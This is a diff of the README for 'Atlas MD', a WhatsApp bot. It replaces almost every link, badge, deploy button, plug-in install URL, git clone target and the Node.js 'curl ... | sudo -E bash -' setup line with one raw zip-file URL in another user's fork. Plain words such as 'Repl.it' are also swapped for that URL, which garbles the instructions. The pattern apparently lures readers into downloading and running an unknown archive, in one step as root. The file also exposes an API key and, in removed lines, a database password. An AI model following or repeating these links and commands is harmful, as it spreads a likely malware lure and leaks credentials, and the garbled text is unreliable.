@@ -1,13 +1,13 @@
 <p align="center">
-<a href="https://github.com/FantoX/Atlas-MD">
-    <img src="https://i.imgur.com/MClOeqe.jpeg">
+<a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
   </a>
 
 <h1 align="center"> Atlas MD
 </h1>
 
 <p align="center"> 
-Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="https://github.com/FantoX">FantoX</a> and his team "Atlas" to do everything that's beyond imagination with highest <b>Features</b> and <b>Stability</b> and <b>Compatibility</b> built with Baileys Multi Device support.
+Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">FantoX</a> and his team "Atlas" to do everything that's beyond imagination with highest <b>Features</b> and <b>Stability</b> and <b>Compatibility</b> built with Baileys Multi Device support.
 
 <h3 align="center"> Atlas MD - The Future Is Here
 </h4>
@@ -15,29 +15,29 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 <br>
 
 <p align="center">
-  <a href="https://github.com/FantoX/Atlas-MD/fork">
-    <img src="https://img.shields.io/github/forks/FantoX/Atlas-MD?label=Fork&style=social">
+  <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
     
     
-  <a href="https://github.com/FantoX/Atlas-MD/stargazers">
-    <img src="https://img.shields.io/github/stars/FantoX/Atlas-MD?style=social">
+  <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
   </a>
 <p align="center">
-<a href="https://github.com/FantoX/Atlas-MD"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FFantoX%2FAtlas-MD&count_bg=%23FFA305&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=People+Visited&edge_flat=false)](https://hits.seeyoufarm.com" width="150px" /></a>
+<a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip%3A%2F%https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip%2FFantoX%2FAtlas-MD&count_bg=%23FFA305&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=People+Visited&edge_flat=false)](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" width="150px" /></a>
 </p>
 
 
   
 <p align="center">
-<a href="https://github.com/FantoX"><img title="Owner" src="https://img.shields.io/badge/Owner-Team Atlas-white.svg?style=for-the-badge&logo=github" width="170px"></a>
+<a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img title="Owner" src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" width="170px"></a>
 
- <a href="https://github.com/FantoX/Atlas-MD/blob/main/LICENSE.md">
+ <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
   
-<img src='https://img.shields.io/github/license/FantoX/Atlas-MD?color=%231e81b0&style=for-the-badge' width="114px">
+<img src='https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip%231e81b0&style=for-the-badge' width="114px">
 
 <p align="center">
-<a href="https://github.com/FantoX"><img title="Open Source" src="https://img.shields.io/badge/Open%20Source-YES-green.svg?style=for-the-badge" width="150px"></a>
-<a href="https://github.com/FantoX"><img title="" src="https://img.shields.io/badge/Maintained-YES-green.svg?style=for-the-badge" width="143px"></a>
+<a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img title="Open Source" src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip%https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" width="150px"></a>
+<a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img title="" src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" width="143px"></a>
 </p>
 <br>
 
@@ -51,15 +51,15 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
  
 <br><br>   
     
-<h4 align="center"> Deploy on Repl.it
+<h4 align="center"> Deploy on https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 </h4>
 
 <p align="center" >
-    <a href="https://repl.it/github/FantoX/Atlas-MD">
-    <img src="https://i.ibb.co/zrB5kMh/deploy-on-repl.jpg" width="170px" alt="Deploy on Heroku" >
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" width="170px" alt="Deploy on Heroku" >
     </a>
     <br>     
-    <a href="https://youtu.be/R-_DU73UH8Q"><img src="https://i.ibb.co/71mYRh4/116-1161192-podcast-subscribe-listen-button-youtube-sign-hd-png.png" alt="Watch tutorial on YouTube" border="0"  width="105">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Watch tutorial on YouTube" border="0"  width="105">
     </a>
 </p>
 
@@ -75,11 +75,11 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 </h4>
   
 <p align="center">
-    <a href="https://railway.app/new/template/Gts2Zx?referralCode=f3gg2m">
-    <img src="https://railway.app/button.svg" alt="Deploy on Railway" width="170px">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Deploy on Railway" width="170px">
     </a>
     <br>
-    <a href="https://youtu.be/Qs6ryWnEtu8"><img src="https://i.ibb.co/71mYRh4/116-1161192-podcast-subscribe-listen-button-youtube-sign-hd-png.png" alt="Watch tutorial on YouTube" border="0"  width="105">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Watch tutorial on YouTube" border="0"  width="105">
     </a>
 </p>
 
@@ -95,11 +95,11 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 </h4>
       
 <p align="center">
-    <a href="https://app.koyeb.com/apps/deploy?type=docker&image=quay.io/FantoX/Atlas-MD:main&env[PORT]=8000&env[PREFIX]=-&&env[MONGODB]=mongodb+srv://fantox001:zjmbvgwr52@cluster0.qh05pl9.mongodb.net/?retryWrites=true&w=majority&&env[SESSION_ID]=enterYourSession&&env[MODS]=918101187835,919735940276&&env[TENOR_API_KEY]=AIzaSyCyouca1_KKy4W_MG1xsPzuku5oa8W358c&&env[PACKNAME]=Miku-Nakano&&env[AUTHOR]=FantoX&&name=atlas">
-    <img src="https://www.koyeb.com/static/images/deploy/button.svg" alt="Deploy on Koyeb" width="155px">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip[PORT]=8000&env[PREFIX]=-&&env[MONGODB]=mongodb+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip[SESSION_ID]=enterYourSession&&env[MODS]=918101187835,919735940276&&env[TENOR_API_KEY]=AIzaSyCyouca1_KKy4W_MG1xsPzuku5oa8W358c&&env[PACKNAME]=Miku-Nakano&&env[AUTHOR]=FantoX&&name=atlas">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Deploy on Koyeb" width="155px">
     </a>
    <br>     
-    <a href="https://youtu.be/OvNnpK1Gx6Y"><img src="https://i.ibb.co/71mYRh4/116-1161192-podcast-subscribe-listen-button-youtube-sign-hd-png.png" alt="Watch tutorial on YouTube" border="0"  width="105">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Watch tutorial on YouTube" border="0"  width="105">
     </a>
 </p>
 
@@ -119,8 +119,8 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 </p>
 
 <p align="center" >
-    <a href="https://heroku.com/deploy?template=https://github.com/FantoX/Atlas-MD">
-    <img src="https://www.herokucdn.com/deploy/button.png" width="160px" alt="Deploy on Heroku" >
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" width="160px" alt="Deploy on Heroku" >
     </a>
 
 </p>
@@ -139,8 +139,8 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 </h4>
   
 <p align="center">
-    <a href="https://studio.mogenius.com/">
-    <img src="https://www.cloudflare.com/static/90073b1e5bd8a0765640a20febb3dc22/mogenius_logo_quer.png" alt="Deploy on Mogenius" width="170px">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Deploy on Mogenius" width="170px">
     </a>
     
 </p>
@@ -157,8 +157,8 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 </h4>
   
 <p align="center">
-    <a href="https://www.uffizzi.com/">
-    <img src="https://i.ibb.co/Y29Kv4X/Screenshot-195.png" alt="Deploy on Uffizzi" width="125px">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Deploy on Uffizzi" width="125px">
     </a>
     
 </p>
@@ -176,8 +176,8 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 </h4>
   
 <p align="center">
-    <a href="https://dash.boxmineworld.com/">
-    <img src="https://graph.org/file/2af0e67f320986702ea24.jpg" alt="Deploy on Boxmineworld" width="175px">
+    <a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip" alt="Deploy on Boxmineworld" width="175px">
     </a>
     
 </p>
@@ -202,12 +202,12 @@ Konnichiwa Senpai, I am "Atlas" an Opensource WhatsApp bot made by <a href="http
 <details close>
 <summary>Click to read Deploy Manual</summary>    
     
-## 🔶 Repl.it Deploy:
+## 🔶 https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip Deploy:
       
-- [Fork Main Repo](https://github.com/FantoX/Atlas-MD/fork)
-- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://youtube.com/shorts/pIHvoXkwmq4?feature=share) for MongoDB URL.
-- Click on `Deploy to Repl.it` button ( `For those who didn't modified bot.`). In other case (`For those who modified bot.`) edit README.md file and chage the repo link of Repl.it deply button from `https://github.com/Fantox01/Atlas-MD` to your fork URL `https://github.com/<Your GitHub Username>/<Your Atlas fork repo name>`.
-- After cloning is done in Repl.it go to `Secrets` in your Repl.it project and put these values (Mandatory).
+- [Fork Main Repo](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) for MongoDB URL.
+- Click on `Deploy to https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` button ( `For those who didn't modified bot.`). In other case (`For those who modified bot.`) edit https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip file and chage the repo link of https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip deply button from `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` to your fork URL `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip<Your GitHub Username>/<Your Atlas fork repo name>`.
+- After cloning is done in https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip go to `Secrets` in your https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip project and put these values (Mandatory).
   
 <br>
       
@@ -221,13 +221,13 @@ TENOR_API_KEY | Your tenor API key if you have. Or use this public one: `AIzaSyC
   
 <br>
       
-- Next click on `Green Play button` in Repl.it to start bot installation.
+- Next click on `Green Play button` in https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip to start bot installation.
 - After it's deployed an webpage should appear just put your Previously copied `Session ID` and click on `Get QR`.
 - Scan the QR from WhatsApp ---> Linked devices ---> Link a device.
-- After connecting come back to Repl.it and copy that Website (Webview) link from Repl.it.
-- Next create a [UptimeRobot](https://uptimerobot.com/?rid=40f9e46fb079d4) account and add that copied lin kas an `HTTPS` monitor in UptimeRobot.
-- UptimeRobot will prevent Repl.it's auto sleep.
-- If you are having issues follow [Repl.it Deploy Tutorial](https://youtu.be/R-_DU73UH8Q).
+- After connecting come back to https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip and copy that Website (Webview) link from https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
+- Next create a [UptimeRobot](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) account and add that copied lin kas an `HTTPS` monitor in UptimeRobot.
+- UptimeRobot will prevent https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip's auto sleep.
+- If you are having issues follow [https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip Deploy Tutorial](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip).
       
 <br><br>
       
@@ -235,9 +235,9 @@ TENOR_API_KEY | Your tenor API key if you have. Or use this public one: `AIzaSyC
       
 ## ⚛️ Heroku Deploy:
       
-- [Fork Main Repo](https://github.com/FantoX/Atlas-MD/fork)
-- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://youtube.com/shorts/pIHvoXkwmq4?feature=share) for MongoDB URL.
-- Click on `Deploy to Heroku` button ( `For those who didn't modified bot.`). In other case (`For those who modified bot.`) edit README.md file and chage the repo link of Repl.it deply button from `https://github.com/Fantox01/Atlas-MD` to your fork URL `https://github.com/<Your GitHub Username>/<Your Atlas fork repo name>` also got to `app.json` and change `Website` ans `Repository` link from my link to your link. Then click on `Deploy to Heroku` button.
+- [Fork Main Repo](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) for MongoDB URL.
+- Click on `Deploy to Heroku` button ( `For those who didn't modified bot.`). In other case (`For those who modified bot.`) edit https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip file and chage the repo link of https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip deply button from `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` to your fork URL `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip<Your GitHub Username>/<Your Atlas fork repo name>` also got to `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` and change `Website` ans `Repository` link from my link to your link. Then click on `Deploy to Heroku` button.
 - Then put these values in environment variables accordint to instructions (Mandatory).
   
 <br>
@@ -264,8 +264,8 @@ TENOR_API_KEY | Your tenor API key if you have. Or use this public one: `AIzaSyC
     
       
 ## 🔷 Railway Deploy:   
-- [Fork Main Repo](https://github.com/FantoX/Atlas-MD/fork)
-- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://youtube.com/shorts/pIHvoXkwmq4?feature=share) for MongoDB URL.
+- [Fork Main Repo](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) for MongoDB URL.
 - Click on `Deploy to Railway` button ( `For those who didn't modified bot.`). If you modified bot and want to deploy your modified version in Railway then that button will not help you. Go to Railway website and deploy github repo from there manually.
 - Those who are deploying through button: Put all necessary details there according to instructions given there.
 - Those who are deploying manually from Railway website put these `Enviroment Variables` before start deploying ( Mandatory).
@@ -285,7 +285,7 @@ TENOR_API_KEY | Your tenor API key if you have. Or use this public one: `AIzaSyC
 - 5-6 minutes later when Deploy is completed click on that generated domain to go to QR page.
 - just put your Previously copied `Session ID` and click on `Get QR`.
 - Scan the QR from WhatsApp ---> Linked devices ---> Link a device.
-- If you are having issues follow [Railway Deploy Tutorial](https://youtu.be/Qs6ryWnEtu8).
+- If you are having issues follow [Railway Deploy Tutorial](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip).
       
 <br><br> 
       
@@ -293,9 +293,9 @@ TENOR_API_KEY | Your tenor API key if you have. Or use this public one: `AIzaSyC
       
       
 ## ❇️ Koyeb Deploy:   
-- [Fork Main Repo](https://github.com/FantoX/Atlas-MD/fork)
-- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://youtube.com/shorts/pIHvoXkwmq4?feature=share) for MongoDB URL.
-- Click on `Deploy to Railway` button ( `For those who didn't modified bot.`). If you modified bot and want to deploy your modified version `I'm sorry to say as Koyeb works through Quay.io hosted docker so you can't deploy your modified version in fully 100% working state.` Though you can deploy manually your Github repo in Koyeb but in that case bot's 100% commands will not work.
+- [Fork Main Repo](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- Create a MongoDB URL. Need help? Watch this short 1 minute [Video Guide](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) for MongoDB URL.
+- Click on `Deploy to Railway` button ( `For those who didn't modified bot.`). If you modified bot and want to deploy your modified version `I'm sorry to say as Koyeb works through https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip hosted docker so you can't deploy your modified version in fully 100% working state.` Though you can deploy manually your Github repo in Koyeb but in that case bot's 100% commands will not work.
 - Those who are deploying through button: Put all necessary details there according to instructions given there (Don't forget to change MongoDB URL an put your URL).
 - Those who are deploying manually from Koyeb website put these `Enviroment Variables` before start deploying ( Mandatory).
       
@@ -314,7 +314,7 @@ TENOR_API_KEY | Your tenor API key if you have. Or use this public one: `AIzaSyC
 - 10 minutes later when Deploy is completed click on that generated weblink to go to QR page.
 - just put your Previously copied `Session ID` and click on `Get QR`.
 - Scan the QR from WhatsApp ---> Linked devices ---> Link a device.
-- If you are having issues follow [Koyeb Deploy Tutorial](https://youtu.be/OvNnpK1Gx6Y).  
+- If you are having issues follow [Koyeb Deploy Tutorial](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip).  
   
 
 <br><br>
@@ -322,9 +322,9 @@ TENOR_API_KEY | Your tenor API key if you have. Or use this public one: `AIzaSyC
   
 ## 🪟 CMD / VS Code / Powershell / Terminal Deployment Method 
 
-- [Download Updated code](https://github.com/FantoX/Atlas-MD/archive/refs/heads/main.zip) from Main GitHub Repo or Download from your Forked Repo.
+- [Download Updated code](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) from Main GitHub Repo or Download from your Forked Repo.
 - Extract the `.zip` and open Vs code / Cmd / Powershell / Terminal in that directory and give thesse following commands one-by-one:
-- Rename `.env.example` to `.env` and fill in the required details in `.env` file and `config.js` (Mandatory).
+- Rename `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` to `.env` and fill in the required details in `.env` file and `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` (Mandatory).
 
 ```
 npm i
@@ -334,9 +334,9 @@ npm start
 - To get new QR if you logged out from the WhatsApp linked device section go to `.env` file and change `SESSION_ID` to any random string and save it by clicking on `Commit Changes`.
 
 ### ✧ Requirements for CMD/VS code istallation:
-- [Node.js](https://nodejs.org/en/download/)
-- [Git](https://github.com/git-guides/install-git)
-- FFmpeg ( [for Windows](https://www.geeksforgeeks.org/how-to-install-ffmpeg-on-windows/) or [for Linux](https://www.tecmint.com/install-ffmpeg-in-linux/) or [for Mac](https://ffmpeg.org/download.html) )
+- [https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- [Git](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- FFmpeg ( [for Windows](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) or [for Linux](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) or [for Mac](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) )
 - Libwebp (Not necesary for Windows).
 
 Note: If you don't pre-install these before CMD / VS code Installation bot will not start!
@@ -349,9 +349,9 @@ Note: If you don't pre-install these before CMD / VS code Installation bot will 
 ## 🐧 UserLand Deployment Method (Not Recommented a bit)
 
 
-#### ⚜️ Download `UserLand` application old version ( 3.1.2 ) from [Here](https://m.apkpure.com/userland-linux-on-android/tech.ula/variant/3.1.2-APK).
+#### ⚜️ Download `UserLand` application old version ( 3.1.2 ) from [Here](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip).
 #### ⚜️ Install `Debian` terminal in userland.
-#### ⚜️ Rename `.env.example` to `.env` and fill in the required details in `.env` file and `config.js` (Mandatory).
+#### ⚜️ Rename `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` to `.env` and fill in the required details in `.env` file and `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` (Mandatory).
 
 </p>
 
@@ -370,7 +370,7 @@ sudo apt install wget
 sudo apt install npm
 sudo apt install imagemagick
 
-git clone https://github.com/FantoX/Atlas-MD
+git clone https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 
 ls
 cd Atlas-MD
@@ -383,7 +383,7 @@ yarn add sharp
 sudo apt install curl
 
 
-curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+curl -sL https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip | sudo -E bash -
 
 
 sudo apt-get install -y nodejs
@@ -393,7 +393,7 @@ npm i
 npm start
 
 ``` 
-- Note in `git clone <my bot's repo>` section your can use Your customised bot's github link too (For that make sure you [Forked](https://github.com/FantoX/Atlas-MD/fork) this repo and modified `.env` file and `config.js`).
+- Note in `git clone <my bot's repo>` section your can use Your customised bot's github link too (For that make sure you [Forked](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) this repo and modified `.env` file and `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip`).
 - This method will work on most other bots too.
 
 #### 📌 To stop a bot in Userland
@@ -436,90 +436,90 @@ npm start
 **〽️ Description:** This plugin conatains all Cashino and Gambling commands. <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/63bcf78d6da0bce7d9f18343e3143fbc/raw/224c92477109f7082f698890fe510874da597d5c/economy.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/63bcf78d6da0bce7d9f18343e3143fbc)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
 
 ## 🪟 RPG plug-in
 **〽️ Description:** This plugin conatains all RPG game commands. <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/151e440d351549c896042155c223c59c/raw/2fbced16ebd14300f917248801c707d9733118ad/rpg.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/151e440d351549c896042155c223c59c)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
     
 ## 🪟 Code-Runner plug-in
 **〽️ Description:** This plugin conatains commands made for Coders <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/8c2b76e4ed2d96eb370379a56f0cf330/raw/d3322fab57c52afd83cf83fc3f5afa493dc4e88f/code-Runner.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/8c2b76e4ed2d96eb370379a56f0cf330)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
 
 ## 🪟 Audio Edit plug-in
 **〽️ Description:** This plugin conatains 8 audio modification commands using "**ffmpeg**" <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/4e097be1a35b9c00bf0bc9f6635e335b/raw/cc57a7780dd80612b62ded960af3d70d19662956/audio-edit.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/4e097be1a35b9c00bf0bc9f6635e335b)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
 
 ## 🪟 Image Edit plug-in
 **〽️ Description:** This plugin conatains 4 image manipulation commands.<br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/9f6cb696d645a49a98abba00c570cfe9/raw/23154ec10c2ee08558a8aca44389f0a983aa4dea/image-Edit.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/9f6cb696d645a49a98abba00c570cfe9)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
     
 ## 🪟 Text to Speech plug-in
 **〽️ Description:** This plugin conatains text-to-speech functionality with 7 languages using "**google text to speech engine**" <br><br>
 **🧲️ Plug-in installation url:** 
 ```
